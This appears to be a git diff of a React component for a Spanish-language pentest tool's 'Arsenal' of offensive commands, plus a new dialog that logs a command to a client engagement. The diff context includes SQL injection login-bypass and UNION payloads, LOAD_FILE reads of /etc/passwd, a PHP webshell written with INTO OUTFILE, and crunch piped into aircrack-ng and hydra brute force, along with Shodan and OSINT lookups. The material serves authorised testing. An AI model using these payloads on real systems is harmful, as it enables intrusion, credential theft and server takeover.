     command: '# Buscar por país y puerto:\ncountry:"AR" port:22\n\n# Servicios específicos:\nport:554 Hipcam country:AR\nproftpd port:21\n"authentication disabled" port:5900\n\n# Por red u organización:\norg:"Telecom Argentina"\nnet:200.49.0.0/16\n\n# Desde CLI:\nshodan search "apache" --limit 100\nshodan host <ip>',
     description: 'Shodan indexa dispositivos conectados a internet. Sus dorks permiten filtrar por país, puerto, producto, organización y rango de IP. Útil para footprinting de redes de un cliente antes del engagement.',
     tags: ['shodan', 'dork', 'recon', 'osint', 'iot', 'network'],
@@ -1760,18 +1903,18 @@ const COMANDOS: Comando[] = [
   {
     id: 'dork-bing-ip',
     tool: 'google-dorks', phase: 'recon', category: 'OSINT',
-    title: 'Bing — Reverse IP lookup (dominio por IP)',
+    title: 'Bing - Reverse IP lookup (dominio por IP)',
     command: '# Bing soporta búsqueda por IP (Google no):\nip:1.2.3.4\n\n# Encontrar todos los dominios en el mismo servidor:\nip:200.49.190.30\n\n# Combinado con site:\nip:200.49.190.30 site:target.com\n\n# Alternativa online:\n# https://viewdns.info/reverseip/',
-    description: 'Bing permite búsqueda por IP con el operador ip: — Google no lo soporta. Fundamental para encontrar todos los dominios alojados en el mismo servidor. Un sitio vulnerable puede dar acceso lateral a otros en el mismo host.',
+    description: 'Bing permite búsqueda por IP con el operador ip: - Google no lo soporta. Fundamental para encontrar todos los dominios alojados en el mismo servidor. Un sitio vulnerable puede dar acceso lateral a otros en el mismo host.',
     tags: ['bing', 'dork', 'reverse-ip', 'osint', 'recon'],
     mitreId: 'T1590',
   },
 
-  // ── OSRFRAMEWORK — OSINT especializado ────────────────────────────────────────
+  // ── OSRFRAMEWORK - OSINT especializado ────────────────────────────────────────
   {
     id: 'osrf-user-search',
     tool: 'osrframework', phase: 'recon', category: 'OSINT',
-    title: 'usufy — buscar username en múltiples plataformas',
+    title: 'usufy - buscar username en múltiples plataformas',
     command: '# Buscar un username en todas las plataformas:\nusufy -n targetuser -p all\n\n# En plataformas específicas:\nusufy -n targetuser -p twitter,instagram,github,reddit\n\n# Alternativa moderna (Sherlock):\npython3 sherlock targetuser\npython3 sherlock targetuser --site twitter --site github',
     description: 'OSRFramework.usufy busca un nombre de usuario en cientos de plataformas sociales. Permite construir el perfil digital de un objetivo. Sherlock es la alternativa más activa.',
     tags: ['osrf', 'osint', 'username', 'social-media', 'sherlock'],
@@ -1781,7 +1924,7 @@ const COMANDOS: Comando[] = [
   {
     id: 'osrf-email-domain',
     tool: 'osrframework', phase: 'recon', category: 'OSINT',
-    title: 'mailfy / searchfy / phonefy — email, nombre y teléfono',
+    title: 'mailfy / searchfy / phonefy - email, nombre y teléfono',
     command: '# Buscar cuentas asociadas a un email:\nmailfy -m target@gmail.com\n\n# Buscar por nombre completo:\nsearchfy -p all -q "Nombre Apellido"\n\n# Verificar un número (spam, identidad):\nphonefy -n +5491112345678\n\n# Análisis de entidad (URL):\nentify -r all -w https://target.com\n\n# Enumerar dominios relacionados:\ndomainfy -n targetcompany',
     description: 'Herramientas de OSRFramework para correlacionar información: un email puede llevar a username, que lleva a más cuentas. La ingeniería inversa de cada dato descubierto amplía el perfil del objetivo.',
     tags: ['osrf', 'osint', 'email', 'phone', 'domain', 'recon'],
@@ -1789,11 +1932,11 @@ const COMANDOS: Comando[] = [
     notes: 'Instalar: pip3 install osrframework. Al encontrar un email con mailfy, buscar ese username con usufy.',
   },
 
-  // ── CRUNCH — Generación de wordlists ─────────────────────────────────────────
+  // ── CRUNCH - Generación de wordlists ─────────────────────────────────────────
   {
     id: 'crunch-basic',
     tool: 'crunch', phase: 'general', category: 'Password Cracking',
-    title: 'Crunch — sintaxis básica y clases de caracteres',
+    title: 'Crunch - sintaxis básica y clases de caracteres',
     command: '# Sintaxis: crunch <min> <max> [charset] [opciones]\n# Clases de caracteres con -t:\n#   @ = minúsculas (a-z)\n#   , = mayúsculas (A-Z)\n#   % = números (0-9)\n#   ^ = símbolos (!@#$...)\n\n# Generar contraseñas de exactamente 8 chars: kill0r + número + minúscula:\ncrunch 8 8 -t kill0r%@ -o wordlist.txt\n\n# Contraseñas de 6 chars con letras abc y números 123:\ncrunch 6 6 abc123 -t @@@@c@ -o out.txt\n\n# Todas las combinaciones 4-8 chars alfanuméricas:\ncrunch 4 8 qwertyuiopasdfghjklzxcvbnm0123456789 -o big.txt',
     description: 'Crunch genera wordlists personalizadas con patrones específicos. Los operadores de patrón (-t) permiten fijar partes conocidas de la contraseña y generar variaciones en posiciones específicas.',
     tags: ['crunch', 'wordlist', 'brute-force', 'password', 'generate'],
@@ -1803,18 +1946,18 @@ const COMANDOS: Comando[] = [
   {
     id: 'crunch-piped-attacks',
     tool: 'crunch', phase: 'general', category: 'Password Cracking',
-    title: 'Crunch piped — sin disco, pausable',
+    title: 'Crunch piped - sin disco, pausable',
     command: '# Ataque WPA directo sin guardar en disco:\ncrunch 8 8 abc123 | aircrack-ng -w - -b AA:BB:CC:DD:EE:FF handshake.cap\n\n# Con John para guardar sesión y reanudar:\ncrunch 8 8 | john --stdin --session=mysession --stdout | aircrack-ng -w - -b AA:BB:CC:DD:EE:FF handshake.cap\n\n# Reanudar sesión pausada:\ncrunch 8 8 | john --restore=mysession | aircrack-ng -w - -b AA:BB:CC:DD:EE:FF handshake.cap\n\n# Con hydra (SSH):\ncrunch 6 6 abc123 | hydra -l admin -P - 192.168.1.1 ssh',
     description: 'Pasar crunch directamente a la herramienta de ataque via pipe evita escribir en disco (más rápido, sin espacio). John actúa como intermediario para poder pausar/reanudar el ataque.',
     tags: ['crunch', 'pipe', 'wordlist', 'aircrack', 'hydra', 'john'],
     mitreId: 'T1110',
   },
 
-  // ── MANUAL SQLi — Quick Reference ─────────────────────────────────────────────
+  // ── MANUAL SQLi - Quick Reference ─────────────────────────────────────────────
   {
     id: 'sqli-bypass-auth',
     tool: 'manual-sqli', phase: 'exploitation', category: 'SQL Injection',
-    title: 'Bypass de autenticación — payloads clásicos',
+    title: 'Bypass de autenticación - payloads clásicos',
     command: "# En campo usuario (el password puede ser cualquier cosa):\n' OR '1'='1\n' OR '1'='1' --\n' OR '1'='1' #\nadmin'--\nadmin'#\n\n# Con campo específico conocido:\n' OR (1=1 AND username='admin') --\n\n# Variantes para MySQL:\n' OR 1=1 LIMIT 1 --\n' OR 1=1 LIMIT 1 #\n\n# Para testear si hay inyección:\n'\n''\n`\n\"\"",
     description: 'Payloads para bypass de login sin sqlmap. El -- y # comentan el resto de la query SQL. Probar primero los más simples y aumentar complejidad. Si el sitio muestra error de SQL al ingresar una comilla simple, confirma inyección.',
     tags: ['sqli', 'manual', 'bypass', 'auth', 'login', 'web'],
@@ -1824,7 +1967,7 @@ const COMANDOS: Comando[] = [
   {
     id: 'sqli-union-recon',
     tool: 'manual-sqli', phase: 'exploitation', category: 'SQL Injection',
-    title: 'UNION-based — enumerar columnas y bases de datos',
+    title: 'UNION-based - enumerar columnas y bases de datos',
     command: "# Primero determinar número de columnas:\n' ORDER BY 1--\n' ORDER BY 2--  (incrementar hasta dar error)\n\n# Luego UNION SELECT con NULLs:\n' UNION SELECT NULL--\n' UNION SELECT NULL,NULL--\n' UNION SELECT NULL,NULL,NULL--\n\n# Identificar columna de texto:\n' UNION SELECT 'a',NULL,NULL--\n' UNION SELECT NULL,'a',NULL--\n\n# Extraer versión y base de datos actual:\n' UNION SELECT @@version,NULL,NULL--\n' UNION SELECT database(),NULL,NULL--\n' UNION SELECT user(),NULL,NULL--\n\n# Listar tablas:\n' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--",
     description: 'Inyección UNION permite extraer datos de otras tablas. Primero encontrar el número de columnas con ORDER BY, luego usar UNION SELECT con la misma cantidad de columnas. Compatible con MySQL, PostgreSQL, SQLite.',
     tags: ['sqli', 'union', 'manual', 'mysql', 'postgresql', 'web'],
@@ -1833,7 +1976,7 @@ const COMANDOS: Comando[] = [
   {
     id: 'sqli-lfi-via-load',
     tool: 'manual-sqli', phase: 'exploitation', category: 'SQL Injection',
-    title: 'SQLi avanzado — LOAD_FILE y INTO OUTFILE',
+    title: 'SQLi avanzado - LOAD_FILE y INTO OUTFILE',
     command: "# Leer archivo del servidor (requiere permisos FILE):\n' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--\n' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL--\n\n# Escribir webshell al servidor:\n' UNION SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--\n\n# Verificar si tenemos permisos:\n' UNION SELECT super_priv FROM mysql.user WHERE user=user()--",
     description: 'Si MySQL tiene FILE privilege habilitado, LOAD_FILE permite leer archivos del servidor y INTO OUTFILE escribir. Puede llevar a RCE al escribir una webshell. Requiere conocer la ruta del webroot.',
     tags: ['sqli', 'mysql', 'file-read', 'webshell', 'rce', 'web'],
@@ -1883,6 +2026,147 @@ const KALI_BADGE: Record<string, { label: string; cls: string }> = {
   no:      { label: '✗ Kali', cls: 'text-zinc-600' },
 }
 
+// ─── Send to Engagement ───────────────────────────────────────────────────────
+type EngBasic = { id: string; title: string; client_name: string; status: string; current_phase: string }
+
+const ENG_PHASE_OPTIONS = [
+  { value: 'planning',          label: 'Planificación' },
+  { value: 'recon',             label: 'Reconocimiento' },
+  { value: 'scanning',          label: 'Escaneo' },
+  { value: 'exploitation',      label: 'Explotación' },
+  { value: 'post_exploitation', label: 'Post-Explotación' },
+  { value: 'reporting',         label: 'Reporting' },
+]
+
+const ARSENAL_TO_ENG: Record<Phase, string> = {
+  recon:            'recon',
+  scanning:         'scanning',
+  exploitation:     'exploitation',
+  post_exploitation:'post_exploitation',
+  general:          'recon',
+}
+
+function SendToEngagementDialog({ cmd, onClose }: { cmd: Comando | null; onClose: () => void }) {
+  const [engs, setEngs]         = useState<EngBasic[]>([])
+  const [loading, setLoading]   = useState(true)
+  const [engId, setEngId]       = useState('')
+  const [phase, setPhase]       = useState('')
+  const [target, setTarget]     = useState('')
+  const [notes, setNotes]       = useState('')
+  const [saving, setSaving]     = useState(false)
+
+  // Reset + load engagements when dialog opens
+  useEffect(() => {
+    if (!cmd) return
+    setPhase(ARSENAL_TO_ENG[cmd.phase])
+    setTarget('')
+    setNotes(cmd.description || '')
+    setLoading(true)
+    apiFetch<EngBasic[]>('/engagements')
+      .then(data => {
+        const active = (data ?? []).filter(e => e.status !== 'completed' && e.status !== 'cancelled')
+        setEngs(active)
+        if (active.length > 0) setEngId(active[0].id)
+      })
+      .catch(() => setEngs([]))
+      .finally(() => setLoading(false))
+  }, [cmd])
+
+  if (!cmd) return null
+
+  async function submit() {
+    if (!engId || !phase) return
+    setSaving(true)
+    try {
+      await apiFetch(`/engagements/${engId}/phases/${phase}/logs`, {
+        method: 'POST',
+        body: { target: target || null, tool: cmd!.tool, command: cmd!.command, notes: notes || null },
+      })
+      toast.success('Comando agregado al engagement')
+      onClose()
+    } catch (e: any) {
+      toast.error(e.message)
+    } finally {
+      setSaving(false)
+    }
+  }
+
+  return (
+    <div className='fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm' onClick={e => { if (e.target === e.currentTarget) onClose() }}>
+      <div className='w-full max-w-lg rounded-xl border border-zinc-800 bg-zinc-900 shadow-2xl p-5 space-y-4'>
+
+        {/* Header */}
+        <div className='flex items-start justify-between gap-3'>
+          <div className='min-w-0'>
+            <p className='text-sm font-semibold text-zinc-200 truncate'>{cmd.title}</p>
+            <p className='text-[11px] text-zinc-500 mt-0.5'>Agregar al Operation Log de un engagement</p>
+          </div>
+          <button onClick={onClose} className='text-zinc-500 hover:text-zinc-300 shrink-0'><X className='h-4 w-4' /></button>
+        </div>
+
+        {/* Command preview */}
+        <pre className='rounded-md bg-zinc-950 px-3 py-2.5 text-xs font-mono text-zinc-400 leading-relaxed whitespace-pre-wrap break-all max-h-24 overflow-y-auto'>
+          {cmd.command}
+        </pre>
+
+        {/* Form */}
+        <div className='space-y-3'>
+          {/* Engagement */}
+          <div className='space-y-1'>
+            <label className='text-[10px] text-zinc-500 uppercase font-semibold'>Engagement *</label>
+            {loading ? (
+              <div className='flex items-center gap-2 text-xs text-zinc-500'><Loader2 className='h-3 w-3 animate-spin' /> Cargando...</div>
+            ) : engs.length === 0 ? (
+              <p className='text-xs text-zinc-500'>No hay engagements activos.</p>
+            ) : (
+              <select value={engId} onChange={e => setEngId(e.target.value)}
+                className='w-full rounded-md border border-zinc-700 bg-zinc-950 px-3 py-1.5 text-xs text-zinc-200 focus:outline-none focus:border-red-500/60'>
+                {engs.map(e => (
+                  <option key={e.id} value={e.id}>{e.title} - {e.client_name}</option>
+                ))}
+              </select>
+            )}
+          </div>
+
+          {/* Phase */}
+          <div className='space-y-1'>
+            <label className='text-[10px] text-zinc-500 uppercase font-semibold'>Fase *</label>
+            <select value={phase} onChange={e => setPhase(e.target.value)}
+              className='w-full rounded-md border border-zinc-700 bg-zinc-950 px-3 py-1.5 text-xs text-zinc-200 focus:outline-none focus:border-red-500/60'>
+              {ENG_PHASE_OPTIONS.map(o => <option key={o.value} value={o.value}>{o.label}</option>)}
+            </select>
+          </div>
+
+          {/* Target */}
+          <div className='space-y-1'>
+            <label className='text-[10px] text-zinc-500 uppercase font-semibold'>Target <span className='normal-case text-zinc-600'>(opcional)</span></label>
+            <input value={target} onChange={e => setTarget(e.target.value)}
+              placeholder='192.168.1.1, target.com, ...'
+              className='w-full rounded-md border border-zinc-700 bg-zinc-950 px-3 py-1.5 text-xs text-zinc-200 placeholder-zinc-600 focus:outline-none focus:border-red-500/60' />
+          </div>
+
+          {/* Notes */}
+          <div className='space-y-1'>
+            <label className='text-[10px] text-zinc-500 uppercase font-semibold'>Notas <span className='normal-case text-zinc-600'>(opcional)</span></label>
+            <textarea value={notes} onChange={e => setNotes(e.target.value)} rows={2}
+              className='w-full rounded-md border border-zinc-700 bg-zinc-950 px-3 py-2 text-xs text-zinc-200 placeholder-zinc-600 focus:outline-none focus:border-red-500/60 resize-none' />
+          </div>
+        </div>
+
+        {/* Actions */}
+        <div className='flex gap-2 justify-end pt-1'>
+          <button onClick={onClose} className='px-3 py-1.5 rounded-md text-xs text-zinc-400 hover:text-zinc-200 hover:bg-zinc-800 transition'>Cancelar</button>
+          <button onClick={submit} disabled={saving || !engId || !phase || loading}
+            className='flex items-center gap-1.5 px-3 py-1.5 rounded-md text-xs bg-red-600 text-white hover:bg-red-500 disabled:opacity-40 disabled:cursor-not-allowed transition'>
+            {saving ? <Loader2 className='h-3 w-3 animate-spin' /> : <Send className='h-3 w-3' />}
+            Agregar al log
+          </button>
+        </div>
+      </div>
+    </div>
+  )
+}
+
 // ─── Copy to clipboard ───────────────────────────────────────────────────────
 function CopyButton({ text }: { text: string }) {
   const [copied, setCopied] = useState(false)
@@ -1909,8 +2193,9 @@ interface ComandoCardProps {
   isModified?: boolean
   onEdit?: () => void
   onDelete?: () => void
+  onSend?: () => void
 }
-function ComandoCard({ cmd, isCustom, isModified, onEdit, onDelete }: ComandoCardProps) {
+function ComandoCard({ cmd, isCustom, isModified, onEdit, onDelete, onSend }: ComandoCardProps) {
   return (
     <div className={cn('rounded-lg border bg-zinc-900/50 p-4', isCustom ? 'border-red-900/40' : 'border-zinc-800')}>
       <div className='mb-2 flex items-start justify-between gap-2'>
@@ -1924,6 +2209,12 @@ function ComandoCard({ cmd, isCustom, isModified, onEdit, onDelete }: ComandoCar
           <h3 className='font-medium text-sm text-zinc-200 truncate'>{cmd.title}</h3>
         </div>
         <div className='flex items-center gap-1 shrink-0'>
+          {onSend && (
+            <button onClick={onSend} title='Agregar al engagement'
+              className='p-1 rounded text-zinc-600 hover:text-red-400 hover:bg-red-900/20 transition'>
+              <Send className='h-3 w-3' />
+            </button>
+          )}
           {onEdit && (
             <button onClick={onEdit} className='p-1 rounded text-zinc-600 hover:text-zinc-300 hover:bg-zinc-800 transition'>
               <Pencil className='h-3 w-3' />
@@ -2181,6 +2472,9 @@ export function Comandos({ initialTool }: ComandosProps) {
   const [editCmd, setEditCmd]               = useState<{ cmd: Comando; isBuiltin: boolean } | null>(null)
   const [formSaving, setFormSaving]         = useState(false)
 
+  // Send to engagement
+  const [sendCmd, setSendCmd]               = useState<Comando | null>(null)
+
   const loadCustom = async () => {
     try {
       const [tools, cmds, overrides] = await Promise.all([
@@ -2384,6 +2678,11 @@ export function Comandos({ initialTool }: ComandosProps) {
           <div className='flex items-center gap-2'>
             <Terminal className='h-4 w-4 text-red-500' />
             <h1 className='font-semibold text-sm text-zinc-200'>Arsenal</h1>
+            <HelpPopover
+              title='Arsenal de comandos'
+              description='Colección de comandos ofensivos organizados por herramienta y fase del pentest. Cada comando tiene descripción, flags y notas de uso.'
+              tips={['Copiá un comando con un clic', 'Aplicalo a un engagement activo desde el ícono de flag', 'Filtrá por fase (recon, escaneo, explotación) para encontrar lo que necesitás']}
+            />
             <span className='ml-auto text-xs text-zinc-500'>{allComandos.length} cmds</span>
           </div>
           <div className='relative'>
@@ -2577,6 +2876,7 @@ export function Comandos({ initialTool }: ComandosProps) {
                           const custom = isCustomCmd(cmd.id) ? getCustomCmd(cmd.id) : undefined
                           return (
                             <ComandoCard key={cmd.id} cmd={cmd} isCustom={!!custom} isModified={!!cmd.isModified}
+                              onSend={() => setSendCmd(cmd)}
                               onEdit={isAdmin ? () => { setEditCmd({ cmd, isBuiltin: !cmd.isCustom }); setAddCmdTool(null) } : undefined}
                               onDelete={isAdmin ? () => deleteCmd(cmd) : undefined} />
                           )
@@ -2611,6 +2911,7 @@ export function Comandos({ initialTool }: ComandosProps) {
                             const custom = isCustomCmd(cmd.id) ? getCustomCmd(cmd.id) : undefined
                             return (
                               <ComandoCard key={cmd.id} cmd={cmd} isCustom={!!custom} isModified={!!cmd.isModified}
+                                onSend={() => setSendCmd(cmd)}
                                 onEdit={isAdmin ? () => { setSelectedTool(tool); setTimeout(() => setEditCmd({ cmd, isBuiltin: !cmd.isCustom }), 50) } : undefined}
                                 onDelete={isAdmin ? () => deleteCmd(cmd) : undefined} />
                             )
@@ -2630,6 +2931,9 @@ export function Comandos({ initialTool }: ComandosProps) {
           )}
         </div>
       </div>
+
+      {/* ── Send to Engagement Dialog ─────────────────────────────────────── */}
+      {sendCmd && <SendToEngagementDialog cmd={sendCmd} onClose={() => setSendCmd(null)} />}
     </div>
   )
 }
